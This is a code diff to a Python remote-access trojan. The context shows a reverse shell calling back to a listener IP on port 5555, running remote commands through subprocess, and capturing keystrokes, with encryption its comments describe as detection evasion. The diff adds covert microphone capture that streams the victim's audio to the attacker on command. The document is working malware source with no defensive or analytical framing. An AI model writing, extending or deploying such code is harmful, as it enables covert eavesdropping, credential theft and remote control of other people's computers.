@@ -10,6 +10,7 @@ import time  # For adding delays
 import subprocess  # For running shell commands
 import json  # For encoding and decoding data in JSON format
 import os  # For interacting with the operating system
+import pyaudio
 from cryptography.fernet import Fernet  # Encrypted communication for detection evasion
 from pynput import keyboard  # For capturing keyboard input
 
@@ -43,7 +44,7 @@ def connection():
         time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with Listener IP and port 5555
-            s.connect(('192.168.210.143', 5555))
+            s.connect(('192.168.56.101', 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -118,8 +119,31 @@ def retrieve_keylogger_log():
     log = ""  # Clear the log after retrieving it
     return log_data
 
+def stream_audio(sock, flag):
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 44100
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS,
+                    rate=RATE, input=True, frames_per_buffer=CHUNK)
+
+    try:
+        while flag['on']:
+            data = stream.read(CHUNK)
+            sock.sendall(data)
+    except:
+        pass
+    finally:
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
+
 # Main shell function for command execution
 def shell():
+    streaming_flag = {'on': False}
+    stream_thread = None
     while True:
         # Receive a command from the remote host
         command = reliable_recv()
@@ -152,6 +176,20 @@ def shell():
             # If the command is 'dump_keyslog', retrieve the keylogger log
             log_data = retrieve_keylogger_log()
             reliable_send(log_data)
+        elif command == 'listening_start':
+            if not streaming_flag['on']:
+                streaming_flag['on'] = True
+                reliable_send("[*] Streaming audio from target...")
+                stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
+                stream_thread.start()
+                
+        elif command == 'listening_stop':
+            reliable_send("[*] Stopping audio stream.")
+            streaming_flag['on'] = False
+            if stream_thread:
+                stream_thread.join()
+                
+
         else:
             try:
                 # For other commands, execute them using subprocess
